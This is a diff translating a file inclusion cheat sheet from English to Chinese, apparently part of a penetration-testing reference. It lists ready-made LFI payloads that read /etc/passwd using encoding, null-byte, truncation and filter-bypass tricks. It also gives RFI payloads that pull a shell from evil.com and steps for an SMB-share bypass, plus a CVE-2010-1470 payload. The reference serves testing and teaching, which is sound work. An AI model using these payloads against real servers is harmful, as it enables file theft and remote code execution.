@@ -1,36 +1,38 @@
-# File Inclusion
+[原文文档](README.en.md)
 
-> A File Inclusion Vulnerability refers to a type of security vulnerability in web applications, particularly prevalent in applications developed in PHP, where an attacker can include a file, usually exploiting a lack of proper input/output sanitization. This vulnerability can lead to a range of malicious activities, including code execution, data theft, and website defacement.
+# 文件包含
 
-## Summary
+> 文件包含漏洞是指Web应用程序中的一种安全漏洞，在PHP等语言开发的应用程序中特别常见，攻击者可以包含一个文件，通常是利用缺乏适当的输入/输出清理。这个漏洞可能导致各种恶意活动，包括代码执行、数据窃取和网站篡改。
 
-- [Tools](#tools)
-- [Local File Inclusion](#local-file-inclusion)
-    - [Null Byte](#null-byte)
-    - [Double Encoding](#double-encoding)
-    - [UTF-8 Encoding](#utf-8-encoding)
-    - [Path Truncation](#path-truncation)
-    - [Filter Bypass](#filter-bypass)
-- [Remote File Inclusion](#remote-file-inclusion)
-    - [Null Byte](#null-byte-1)
-    - [Double Encoding](#double-encoding-1)
-    - [Bypass allow_url_include](#bypass-allow_url_include)
-- [Labs](#labs)
-- [References](#references)
+## 摘要
 
-## Tools
+- [工具](#工具)
+- [本地文件包含](#本地文件包含)
+    - [空字节](#空字节)
+    - [双重编码](#双重编码)
+    - [UTF-8编码](#utf-8编码)
+    - [路径截断](#路径截断)
+    - [过滤器绕过](#过滤器绕过)
+- [远程文件包含](#远程文件包含)
+    - [空字节](#空字节-1)
+    - [双重编码](#双重编码-1)
+    - [绕过allow_url_include](#绕过allow_url_include)
+- [实验环境](#实验环境)
+- [参考](#参考)
 
-- [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) (archived on Oct 7, 2020) - kadimus is a tool to check and exploit lfi vulnerability.
-- [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite) - Totally Automatic LFI Exploiter (+ Reverse Shell) and Scanner
-- [kurobeats/fimap](https://github.com/kurobeats/fimap) - fimap is a little python tool which can find, prepare, audit, exploit and even google automatically for local and remote file inclusion bugs in webapps.
-- [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic is an open source penetration testing tool that automates the process of search and retrieval of content for common log and config files through path traversal vulnerabilities.
-- [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - Local File Inclusion discovery and exploitation tool
+## 工具
 
-## Local File Inclusion
+- [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) (于2020年10月7日存档) - kadimus是一个检查和利用LFI漏洞的工具。
+- [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite) - 全自动LFI利用器（+反向Shell）和扫描器
+- [kurobeats/fimap](https://github.com/kurobeats/fimap) - fimap是一个小型Python工具，可以自动查找、准备、审计、利用甚至谷歌搜索Web应用程序中的本地和远程文件包含漏洞。
+- [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic是一个开源渗透测试工具，通过路径遍历漏洞自动搜索和检索常见日志和配置文件的内容。
+- [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - 本地文件包含发现和利用工具
 
-**File Inclusion Vulnerability** should be differentiated from **Path Traversal**. The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application, when the File Inclusion will lead to the execution of arbitrary code.
+## 本地文件包含
 
-Consider a PHP script that includes a file based on user input. If proper sanitization is not in place, an attacker could manipulate the `page` parameter to include local or remote files, leading to unauthorized access or code execution.
+**文件包含漏洞**应与**路径遍历**区分开来。路径遍历漏洞允许攻击者访问文件，通常是利用目标应用程序中实现的"读取"机制，而文件包含将导致任意代码的执行。
+
+考虑一个基于用户输入包含文件的PHP脚本。如果没有适当的清理，攻击者可以操纵`page`参数来包含本地或远程文件，导致未授权访问或代码执行。
 
 ```php
 <?php
@@ -39,43 +41,43 @@ include($file);
 ?>
 ```
 
-In the following examples we include the `/etc/passwd` file, check the `Directory & Path Traversal` chapter for more interesting files.
+在下面的例子中，我们包含`/etc/passwd`文件，更多有趣的文件请查看`目录和路径遍历`章节。
 
 ```powershell
 http://example.com/index.php?page=../../../etc/passwd
 ```
 
-### Null Byte
+### 空字节
 
-:warning: In versions of PHP below 5.3.4 we can terminate with null byte (`%00`).
+:warning: 在低于5.3.4版本的PHP中，我们可以用空字节（`%00`）终止。
 
 ```powershell
 http://example.com/index.php?page=../../../etc/passwd%00
 ```
 
-**Example**: Joomla! Component Web TV 1.0 - CVE-2010-1470
+**示例**: Joomla! Component Web TV 1.0 - CVE-2010-1470
 
 ```ps1
 {{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
 ```
 
-### Double Encoding
+### 双重编码
 
 ```powershell
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
 ```
 
-### UTF-8 Encoding
+### UTF-8编码
 
 ```powershell
 http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
 http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
 ```
 
-### Path Truncation
+### 路径截断
 
-On most PHP installations a filename longer than `4096` bytes will be cut off so any excess chars will be thrown away.
+在大多数PHP安装中，长度超过`4096`字节的文件名会被截断，所以任何多余的字符都会被丢弃。
 
 ```powershell
 http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
@@ -84,7 +86,7 @@ http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE]
 http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
 ```
 
-### Filter Bypass
+### 过滤器绕过
 
 ```powershell
 http://example.com/index.php?page=....//....//etc/passwd
@@ -92,54 +94,54 @@ http://example.com/index.php?page=..///////..////..//////etc/passwd
 http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
 ```
 
-## Remote File Inclusion
+## 远程文件包含
 
-> Remote File Inclusion (RFI) is a type of vulnerability that occurs when an application includes a remote file, usually through user input, without properly validating or sanitizing the input.
+> 远程文件包含（RFI）是一种漏洞，当应用程序通过用户输入包含远程文件时，没有适当验证或清理输入时就会发生这种漏洞。
 
-Remote File Inclusion doesn't work anymore on a default configuration since `allow_url_include` is now disabled since PHP 5.
+由于`allow_url_include`自PHP 5以来已被禁用，远程文件包含在默认配置下不再有效。
 
 ```ini
 allow_url_include = On
 ```
 
-Most of the filter bypasses from LFI section can be reused for RFI.
+LFI部分的大多数过滤器绕过技术可以重复用于RFI。
 
 ```powershell
 http://example.com/index.php?page=http://evil.com/shell.txt
 ```
 
-### Null Byte
+### 空字节
 
 ```powershell
 http://example.com/index.php?page=http://evil.com/shell.txt%00
 ```
 
-### Double Encoding
+### 双重编码
 
 ```powershell
 http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
 ```
 
-### Bypass allow_url_include
+### 绕过allow_url_include
 
-When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still possible to include a remote file on Windows box using the `smb` protocol.
+当`allow_url_include`和`allow_url_fopen`设置为`Off`时。在Windows系统上使用`smb`协议仍然可以包含远程文件。
 
-1. Create a share open to everyone
-2. Write a PHP code inside a file : `shell.php`
-3. Include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`
+1. 创建一个对所有人开放的共享
+2. 在文件中写入PHP代码：`shell.php`
+3. 包含它 `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`
 
-## Labs
+## 实验环境
 
-- [Root Me - Local File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion)
-- [Root Me - Local File Inclusion - Double encoding](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)
-- [Root Me - Remote File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)
-- [Root Me - PHP - Filters](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters)
+- [Root Me - 本地文件包含](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion)
+- [Root Me - 本地文件包含 - 双重编码](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)
+- [Root Me - 远程文件包含](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)
+- [Root Me - PHP - 过滤器](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters)
 
-## References
+## 参考
 
-- [CVV #1: Local File Inclusion - SI9INT - Jun 20, 2018](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
-- [Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction - Mannu Linux - 2019-05-12](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
-- [Is PHP vulnerable and under what conditions? - April 13, 2015 - Andreas Venieris](http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html)
-- [LFI Cheat Sheet - @Arr0way - 24 Apr 2016](https://highon.coffee/blog/lfi-cheat-sheet/)
-- [Testing for Local File Inclusion - OWASP - 25 June 2017](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
-- [Turning LFI into RFI - Grayson Christopher - 2017-08-14](https://web.archive.org/web/20170815004721/https://l.avala.mp/?p=241)
+- [CVV #1: 本地文件包含 - SI9INT - 2018年6月20日](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
+- [在PHP应用程序中利用远程文件包含（RFI）并绕过远程URL包含限制 - Mannu Linux - 2019年5月12日](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
+- [PHP是否易受攻击，在什么条件下？ - 2015年4月13日 - Andreas Venieris](http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html)
+- [LFI备忘单 - @Arr0way - 2016年4月24日](https://highon.coffee/blog/lfi-cheat-sheet/)
+- [测试本地文件包含 - OWASP - 2017年6月25日](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
+- [将LFI转换为RFI - Grayson Christopher - 2017年8月14日](https://web.archive.org/web/20170815004721/https://l.avala.mp/?p=241)
